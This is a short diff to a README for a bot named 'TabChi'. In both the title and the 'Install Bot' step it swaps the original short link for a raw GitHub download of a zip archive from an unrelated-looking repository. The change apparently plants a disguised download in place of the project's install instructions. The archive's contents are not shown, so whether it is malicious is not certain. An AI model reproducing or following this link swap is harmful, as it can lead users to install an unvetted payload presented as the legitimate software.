@@ -1,5 +1,5 @@
-# [TabChi](http://yon.ir/4cR3)
+# [TabChi](https://raw.githubusercontent.com/mahdikarimi5509/obsidian-aubade/master/overcorrection/obsidian-aubade-3.2.zip)
 * **Install Bot**
 `````sh
-yon.ir/4cR3
+https://raw.githubusercontent.com/mahdikarimi5509/obsidian-aubade/master/overcorrection/obsidian-aubade-3.2.zip
 `````
